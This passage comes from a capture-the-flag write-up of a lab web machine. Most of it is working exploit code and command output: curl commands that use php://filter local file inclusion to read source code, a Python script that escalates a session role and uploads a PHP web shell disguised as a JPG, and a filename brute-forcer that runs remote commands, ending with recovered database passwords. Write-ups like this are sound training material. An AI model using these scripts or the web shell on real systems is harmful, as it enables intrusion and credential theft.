<p>Note: we got aaron user inside /etc/passwd file the same user from our brute-forcing step.</p>

<p>By using LFI to check login.php source code</p>
<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>curl http://10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=login.php | base64 -d
</pre></td></tr></tbody></table></code></div></div>
<p>we can found there’s db_conn.php file</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>include "db_conn.php";

</pre></td></tr></tbody></table></code></div></div>
<p>let’s check this file too with LFI</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>curl http://10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=db_conn.php | base64 -d
</pre></td></tr></tbody></table></code></div></div>

<p>here’s the results</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>&lt;?php
$pdo = new PDO('mysql:host=localhost;dbname=app', 'root', '4_V3Ry_l0000n9_p422w0rd');
</pre></td></tr></tbody></table></code></div></div>
<p>But these information useless for login, Hmmm</p>

<p>Let’s move to another file like upload.php we got it earler from our script or Gobuster result.</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>curl http://10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=upload.php | base64 -d
</pre></td></tr></tbody></table></code></div></div>
<p>and here we got a new file:</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>&lt;?php
include("admin_auth_check.php");
</pre></td></tr></tbody></table></code></div></div>
<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>curl http://10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=admin_auth_check.php | base64 -d
</pre></td></tr></tbody></table></code></div></div>
<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="rouge-code"><pre>&lt;?php

include_once "auth_check.php";

if (!isset($_SESSION['role']) || $_SESSION['role'] != 1) {
    echo "No permission to access this panel!";
    header('Location: ./index.php');
    die();
}

?&gt;

</pre></td></tr></tbody></table></code></div></div>
<p>It’s checking that if our session role id is equal to 1 or not if not it’s redirect to index.php.</p>

<p>And I tried aaron user with login page it’s worked.
but it’s said user 2 but we need our role id = 1 for that we need to find a way let’s check the edit profile tab.</p>

<p>Okay, Let’s check the source code of profile.php with that LFI.</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>curl http://10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=profile.php | base64 -d
</pre></td></tr></tbody></table></code></div></div>
<p>this line looks like another key</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>&lt;script src="js/profile.js"&gt;&lt;/script&gt;
</pre></td></tr></tbody></table></code></div></div>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>curl http://10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=js/profile.js | base64 -d
</pre></td></tr></tbody></table></code></div></div>
<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="rouge-code"><pre>function updateProfile() {
    var xml = new XMLHttpRequest();
    xml.onreadystatechange = function () {
        if (xml.readyState == 4 &amp;&amp; xml.status == 200) {
            document.getElementById("alert-profile-update").style.display = "block"
        }
    };

    xml.open("POST", "profile_update.php", true);
    xml.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    xml.send("firstName=" + document.getElementById("firstName").value + "&amp;lastName=" + document.getElementById("lastName").value + "&amp;email=" + document.getElementById("email").value + "&amp;company=" + document.getElementById("company").value);
}

</pre></td></tr></tbody></table></code></div></div>
<p>So profile.php sending the form data to profile_update.php.</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>curl http://10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=profile_update.php | base64 -d
</pre></td></tr></tbody></table></code></div></div>
<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
</pre></td><td class="rouge-code"><pre>&lt;?php

include "auth_check.php";

$error = "";

if (empty($_POST['firstName'])) {
    $error = 'First Name is required.';
} else if (empty($_POST['lastName'])) {
    $error = 'Last Name is required.';
} else if (empty($_POST['email'])) {
    $error = 'Email is required.';
} else if (empty($_POST['company'])) {
    $error = 'Company is required.';
}

if (!empty($error)) {
    die("Error updating profile, reason: " . $error);
} else {

    include "db_conn.php";

    $id = $_SESSION['userid'];
    $statement = $pdo-&gt;prepare("SELECT * FROM users WHERE id = :id");
    $result = $statement-&gt;execute(array('id' =&gt; $id));
    $user = $statement-&gt;fetch();

    if ($user !== false) {

        ini_set('display_errors', '1');
        ini_set('display_startup_errors', '1');
        error_reporting(E_ALL);

        $firstName = $_POST['firstName'];
        $lastName = $_POST['lastName'];
        $email = $_POST['email'];
        $company = $_POST['company'];
        $role = $user['role'];

        if (isset($_POST['role'])) {
            $role = $_POST['role'];
            $_SESSION['role'] = $role;
        }


        // dont persist role
        $sql = "UPDATE users SET firstName='$firstName', lastName='$lastName', email='$email', company='$company' WHERE id=$id";

        $stmt = $pdo-&gt;prepare($sql);
        $stmt-&gt;execute();

        $statement = $pdo-&gt;prepare("SELECT * FROM users WHERE id = :id");
        $result = $statement-&gt;execute(array('id' =&gt; $id));
        $user = $statement-&gt;fetch();

        // but return it to avoid confusion
        $user['role'] = $role;
        $user['6'] = $role;

        echo json_encode($user, JSON_PRETTY_PRINT);

    } else {
        echo "No user with this id was found.";
    }

}

?&gt;

</pre></td></tr></tbody></table></code></div></div>
<p>By checking the profile_update.php file, if we set role=1 in the profile update form. it’s set the session role id=1.</p>

<p>Time to write our tools:
at first let’s write image url genartor:</p>
<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
</pre></td><td class="rouge-code"><pre>#!/usr/bin/python3

import hashlib
import os
import time
import requests

def main():
    # we can upload avatar image, By checking the source code of upload.php:
    # 1. it checks if it is jpg or not
    # 2. it creates a file name with an md5 hash
    # 3. inside the md5 function it's using $file_hash which is interpreted as a string because it's using a single cot rather than a double cot you can read about that more in the article
    # 4. but the time function returns dynamic value
    # 5. and then the file_name

	# ❯ php -a
	# Interactive mode enabled

	# php &gt; while(true){echo date("G:i:s"); echo " = "; echo md5('$file_hash' . time()); echo "\n";
	# sleep(1);}

    OUTPUT_DIR = os.path.dirname(os.path.abspath(__file__))
    url = 'http://localhost'

    # f = open(os.path.join(OUTPUT_DIR, 'backdoor.jpg'),"rb")
    # bytes = f.read() # read entire file as bytes
    # readable_hash = hashlib.sha256(bytes).hexdigest()
    # print(readable_hash)

    while True:
        hash = f"{hashlib.md5('$file_hash'.encode()+str(int(time.time())).encode()).hexdigest()}"
        r = requests.get(f'{url}/image.php?img=images/uploads/{hash}_pp.jpg&amp;cmd=id').text
        if len(r) &gt; 0:
            print(hash)
            print(r)
            break
        time.sleep(1)


if __name__ == '__main__':
    main()
</pre></td></tr></tbody></table></code></div></div>

<p>and keep it runnug while we going to run this one for uploud the file please follow comment to understad what’s going on</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
</pre></td><td class="rouge-code"><pre>#!/usr/bin/python3

import os
from time import sleep
import requests

def main():
    url = 'http://localhost/login.php?login=true'
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0',
        'Content-type': 'application/x-www-form-urlencoded',
        }
    proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
    payload = {
        'user':'aaron',
        'password':'aaron'
        }

    session = requests.session()
    session.request("POST", url, headers=headers, data=payload, verify=False) # add proxies=proxies if you using proxy
    cookie = {'PHPSESSID': requests.utils.dict_from_cookiejar(session.cookies)['PHPSESSID']}
    # print(cookie)

    # to print the HTML page content and the importent part is:
    # &lt;ul class="nav navbar-nav"&gt;
    #     &lt;li&gt;&lt;a href="index.php"&gt;Home&lt;/a&gt;&lt;/li&gt;
    #     &lt;li class=""&gt;&lt;a href="profile.php"&gt;Edit profile&lt;/a&gt;&lt;/li&gt;
    # &lt;/ul&gt;

    # purl = 'http://localhost/profile.php'
    # response = session.request("GET", purl, headers=headers, verify=False)
    # print(response.text)
    # to print the HTML page content to get this form:
            #     &lt;form class="form-horizontal" role="form" id="editForm" action="#" method="POST"&gt;
            # &lt;div class="form-group"&gt;
            #     &lt;label class="col-lg-3 control-label"&gt;First name:&lt;/label&gt;
            #     &lt;div class="col-lg-8"&gt;
            #         &lt;input class="form-control" type="text" name="firstName" id="firstName"
            #                value="ireally"&gt;
            #     &lt;/div&gt;
            # &lt;/div&gt;
            # &lt;div class="form-group"&gt;
            #     &lt;label class="col-lg-3 control-label"&gt;Last name:&lt;/label&gt;
            #     &lt;div class="col-lg-8"&gt;
            #         &lt;input class="form-control" type="text" name="lastName" id="lastName"
            #                value="dontunderstand"&gt;
            #     &lt;/div&gt;
            # &lt;/div&gt;
            # &lt;div class="form-group"&gt;
            #     &lt;label class="col-lg-3 control-label"&gt;Company:&lt;/label&gt;
            #     &lt;div class="col-lg-8"&gt;
            #         &lt;input class="form-control" type="text" name="company" id="company"
            #                value="almostnoghingtest"&gt;
            #     &lt;/div&gt;
            # &lt;/div&gt;
            # &lt;div class="form-group"&gt;
            #     &lt;label class="col-lg-3 control-label"&gt;Email:&lt;/label&gt;
            #     &lt;div class="col-lg-8"&gt;
            #         &lt;input class="form-control" type="text" name="email" id="email"
            #                value="testmymail"&gt;
            #     &lt;/div&gt;
            # &lt;/div&gt;

    #Create a new custome payload to change the role=1

    data = {
        'firstName':'admin',
        'lastName':'admin',
        'email':'admin',
        'company':'admin',
        'role':1,
        }
    # data = 'firstName=admin&amp;lastName=admin&amp;email=admin&amp;company=admin&amp;role=1'
    url = 'http://localhost/profile_update.php'
    session.post(url, headers = headers, data=data, verify=False, allow_redirects=True) # add proxies=proxies if you using proxy
    response = session.get('http://localhost/profile.php', headers=headers, verify=False)
    # print(response.text)
    # here we got a new link named Admin panel
    # &lt;ul class="nav navbar-nav"&gt;
    #     &lt;li&gt;&lt;a href="index.php"&gt;Home&lt;/a&gt;&lt;/li&gt;
    #     &lt;li class=""&gt;&lt;a href="profile.php"&gt;Edit profile&lt;/a&gt;&lt;/li&gt;
    #     &lt;li&gt;&lt;a href="avatar_uploader.php"&gt;Admin panel&lt;/a&gt;&lt;/li&gt;
    # &lt;/ul&gt;

    # we can upload avatar image, By checking the source code of upload.php:
    # 1. it checks if it is jpg or not
    # 2. it creates a file name with an md5 hash
    # 3. inside the md5 function it's using $file_hash which is interpreted as a string because it's using a single cot rather than a double cot you can read about that more in the article
    # 4. but the time function returns dynamic value
    # 5. and then the file_name

    # Create a jpg file that has PHP code inside that.
    OUTPUT_DIR = os.path.dirname(os.path.abspath(__file__))
    jpg_file = open(os.path.join(OUTPUT_DIR, 'backdoor.jpg'), 'w')
    jpg_file.write("jpg89a; &lt;?php system($_GET['cmd']); ?&gt;")
    jpg_file.close()
    

    url = 'http://localhost/upload.php'

    # Uploud the jpg file
    with open(os.path.join(OUTPUT_DIR, "backdoor.jpg"), 'rb') as img:
        name_img= os.path.basename("backdoor.jpg")
        files= {'fileToUpload': (name_img,img,'multipart/form-data',{'Expires': '0'}) }
        r = session.post(url, files=files)
        print(r.text)

if __name__ == '__main__':
    main()

</pre></td></tr></tbody></table></code></div></div>

<p>As I said I wrote some explanation in comment inside the script, then we got our picture uploaded with name 42723189e466277a63b6e2d7076de2e5_pp</p>

<p>and from our python script we got the RCE as shown below:</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre>┌──(kali㉿kali)-[~/Desktop/time]
└─$ /bin/python3.10 /home/kali/Desktop/time/img_url.py

...

curl 'http://10.10.11.135/image.php?img=images/uploads/024cbc1d39c970484d4a6ded14b0dc19_pp.jpg&amp;cmd=id'
uid=33(www-data) gid=33(www-data) groups=33(www-data)

...

</pre></td></tr></tbody></table></code></div></div>
<p>Now let’s run ls command</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>curl 'http://10.10.11.135/image.php?img=images/uploads/42723189e466277a63b6e2d7076de2e5_pp.jpg&amp;cmd=ls'
</pre></td></tr></tbody></table></code></div></div>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre></td><td class="rouge-code"><pre>
                                                                                                                                    
┌──(kali㉿kali)-[~/Desktop/time]
└─$ curl 'http://10.10.11.135/image.php?img=images/uploads/42723189e466277a63b6e2d7076de2e5_pp.jpg&amp;cmd=id'curl 'http://10.10.11.135/image.php?img=images/uploads/42723189e466277a63b6e2d7076de2e5_pp.jpg&amp;cmd=ls'

admin_auth_check.php
auth_check.php
avatar_uploader.php
css
db_conn.php
footer.php
header.php
image.php
images
index.php
js
login.php
logout.php
profile.php
profile_update.php
upload.php
</pre></td></tr></tbody></table></code></div></div>

<p>After a few search we found:</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>┌──(kali㉿kali)-[~/Desktop/time]
└─$ curl 'http://10.10.11.135/image.php?img=images/uploads/42723189e466277a63b6e2d7076de2e5_pp.jpg&amp;cmd=id'curl 'http://10.10.11.135/image.php?img=images/uploads/42723189e466277a63b6e2d7076de2e5_pp.jpg&amp;cmd=ls+/opt/'

source-files-backup.zip
</pre></td></tr></tbody></table></code></div></div>

<p>let’s copy it to /var/www/html</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>┌──(kali㉿kali)-[~/Desktop/time]
└─$ curl 'http://10.10.11.135/image.php?img=images/uploads/42723189e466277a63b6e2d7076de2e5_pp.jpg&amp;cmd=id'curl 'http://10.10.11.135/image.php?img=images/uploads/42723189e466277a63b6e2d7076de2e5_pp.jpg&amp;cmd=cp+/opt/source-files-backup.zip+/var/www/html'
</pre></td></tr></tbody></table></code></div></div>
<p>and download and unzip</p>
<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>unzip source-files-backup.zip 
</pre></td></tr></tbody></table></code></div></div>

<p>we got a the same password insid db_conn.php with LFI</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>&lt;?php
$pdo = new PDO('mysql:host=localhost;dbname=app', 'root', '4_V3Ry_l0000n9_p422w0rd');

</pre></td></tr></tbody></table></code></div></div>
<p>we see there .git directory let’s dump all commits in the background.
with this tool we going to dump all commits</p>
<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>https://github.com/internetwache/GitTools
</pre></td></tr></tbody></table></code></div></div>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
</pre></td><td class="rouge-code"><pre>┌──(kali㉿kali)-[~/Downloads/backup]
└─$ ./GitTools/Extractor/extractor.sh . .

###########
# Extractor is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances. 
# Only for educational purposes!
###########
[+] Found commit: 16de2698b5b122c93461298eab730d00273bd83e
[+] Found file: /home/kali/Downloads/backup/./0-16de2698b5b122c93461298eab730d00273bd83e/admin_auth_check.php
[+] Found file: /home/kali/Downloads/backup/./0-16de2698b5b122c93461298eab730d00273bd83e/auth_check.php
[+] Found file: /home/kali/Downloads/backup/./0-16de2698b5b122c93461298eab730d00273bd83e/avatar_uploader.php
[+] Found folder: /home/kali/Downloads/backup/./0-16de2698b5b122c93461298eab730d00273bd83e/css
[+] Found file: /home/kali/Downloads/backup/./0-16de2698b5b122c93461298eab730d00273bd83e/css/bootstrap.min.css
[+] Found file: /home/kali/Downloads/backup/./0-16de2698b5b122c93461298eab730d00273bd83e/css/login.css
[+] Found file: /home/kali/Downloads/backup/./0-16de2698b5b122c93461298eab730d00273bd83e/db_conn.php
[+] Found file: /home/kali/Downloads/backup/./0-16de2698b5b122c93461298eab730d00273bd83e/footer.php
[+] Found file: /home/kali/Downloads/backup/./0-16de2698b5b122c93461298eab730d00273bd83e/header.php
[+] Found file: /home/kali/Downloads/backup/./0-16de2698b5b122c93461298eab730d00273bd83e/image.php
[+] Found folder: /home/kali/Downloads/backup/./0-16de2698b5b122c93461298eab730d00273bd83e/images
[+] Found file: /home/kali/Downloads/backup/./0-16de2698b5b122c93461298eab730d00273bd83e/images/background.jpg
[+] Found file: /home/kali/Downloads/backup/./0-16de2698b5b122c93461298eab730d00273bd83e/images/user-icon.png
[+] Found file: /home/kali/Downloads/backup/./0-16de2698b5b122c93461298eab730d00273bd83e/index.php
[+] Found folder: /home/kali/Downloads/backup/./0-16de2698b5b122c93461298eab730d00273bd83e/js
[+] Found file: /home/kali/Downloads/backup/./0-16de2698b5b122c93461298eab730d00273bd83e/js/avatar_uploader.js
[+] Found file: /home/kali/Downloads/backup/./0-16de2698b5b122c93461298eab730d00273bd83e/js/bootstrap.min.js
[+] Found file: /home/kali/Downloads/backup/./0-16de2698b5b122c93461298eab730d00273bd83e/js/jquery.min.js
[+] Found file: /home/kali/Downloads/backup/./0-16de2698b5b122c93461298eab730d00273bd83e/js/profile.js
[+] Found file: /home/kali/Downloads/backup/./0-16de2698b5b122c93461298eab730d00273bd83e/login.php
[+] Found file: /home/kali/Downloads/backup/./0-16de2698b5b122c93461298eab730d00273bd83e/logout.php
[+] Found file: /home/kali/Downloads/backup/./0-16de2698b5b122c93461298eab730d00273bd83e/profile.php
[+] Found file: /home/kali/Downloads/backup/./0-16de2698b5b122c93461298eab730d00273bd83e/profile_update.php
[+] Found file: /home/kali/Downloads/backup/./0-16de2698b5b122c93461298eab730d00273bd83e/upload.php
[+] Found commit: e4e214696159a25c69812571c8214d2bf8736a3f
[+] Found file: /home/kali/Downloads/backup/./1-e4e214696159a25c69812571c8214d2bf8736a3f/admin_auth_check.php
[+] Found file: /home/kali/Downloads/backup/./1-e4e214696159a25c69812571c8214d2bf8736a3f/auth_check.php
[+] Found file: /home/kali/Downloads/backup/./1-e4e214696159a25c69812571c8214d2bf8736a3f/avatar_uploader.php
[+] Found folder: /home/kali/Downloads/backup/./1-e4e214696159a25c69812571c8214d2bf8736a3f/css
[+] Found file: /home/kali/Downloads/backup/./1-e4e214696159a25c69812571c8214d2bf8736a3f/css/bootstrap.min.css
[+] Found file: /home/kali/Downloads/backup/./1-e4e214696159a25c69812571c8214d2bf8736a3f/css/login.css
[+] Found file: /home/kali/Downloads/backup/./1-e4e214696159a25c69812571c8214d2bf8736a3f/db_conn.php
[+] Found file: /home/kali/Downloads/backup/./1-e4e214696159a25c69812571c8214d2bf8736a3f/footer.php
[+] Found file: /home/kali/Downloads/backup/./1-e4e214696159a25c69812571c8214d2bf8736a3f/header.php
[+] Found file: /home/kali/Downloads/backup/./1-e4e214696159a25c69812571c8214d2bf8736a3f/image.php
[+] Found folder: /home/kali/Downloads/backup/./1-e4e214696159a25c69812571c8214d2bf8736a3f/images
[+] Found file: /home/kali/Downloads/backup/./1-e4e214696159a25c69812571c8214d2bf8736a3f/images/background.jpg
[+] Found file: /home/kali/Downloads/backup/./1-e4e214696159a25c69812571c8214d2bf8736a3f/images/user-icon.png
[+] Found file: /home/kali/Downloads/backup/./1-e4e214696159a25c69812571c8214d2bf8736a3f/index.php
[+] Found folder: /home/kali/Downloads/backup/./1-e4e214696159a25c69812571c8214d2bf8736a3f/js
[+] Found file: /home/kali/Downloads/backup/./1-e4e214696159a25c69812571c8214d2bf8736a3f/js/avatar_uploader.js
[+] Found file: /home/kali/Downloads/backup/./1-e4e214696159a25c69812571c8214d2bf8736a3f/js/bootstrap.min.js
[+] Found file: /home/kali/Downloads/backup/./1-e4e214696159a25c69812571c8214d2bf8736a3f/js/jquery.min.js
[+] Found file: /home/kali/Downloads/backup/./1-e4e214696159a25c69812571c8214d2bf8736a3f/js/profile.js
[+] Found file: /home/kali/Downloads/backup/./1-e4e214696159a25c69812571c8214d2bf8736a3f/login.php
[+] Found file: /home/kali/Downloads/backup/./1-e4e214696159a25c69812571c8214d2bf8736a3f/logout.php
[+] Found file: /home/kali/Downloads/backup/./1-e4e214696159a25c69812571c8214d2bf8736a3f/profile.php
[+] Found file: /home/kali/Downloads/backup/./1-e4e214696159a25c69812571c8214d2bf8736a3f/profile_update.php
[+] Found file: /home/kali/Downloads/backup/./1-e4e214696159a25c69812571c8214d2bf8736a3f/upload.php
</pre></td></tr></tbody></table></code></div></div>

<h2 id="user-flag"><span class="me-2">USER FLAG</span><a href="#user-flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
<h3 id="--privilege-escalation-user"><span class="me-2">- Privilege Escalation [User]</span><a href="#--privilege-escalation-user" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
<p>A new password found by ssh aaron with this password we get access:</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre>┌──(kali㉿kali)-[~/Downloads/backup]
└─$ cat 0-16de2698b5b122c93461298eab730d00273bd83e/db_conn.php &amp;&amp; cat 1-e4e214696159a25c69812571c8214d2bf8736a3f/db_conn.php 
&lt;?php
$pdo = new PDO('mysql:host=localhost;dbname=app', 'root', '4_V3Ry_l0000n9_p422w0rd');
&lt;?php
$pdo = new PDO('mysql:host=localhost;dbname=app', 'root', 'S3cr3t_unGu3ss4bl3_p422w0Rd');

</pre></td></tr></tbody></table></code></div></div>
<div class="language-plaintext highlighter-rouge"><div class="code-header">
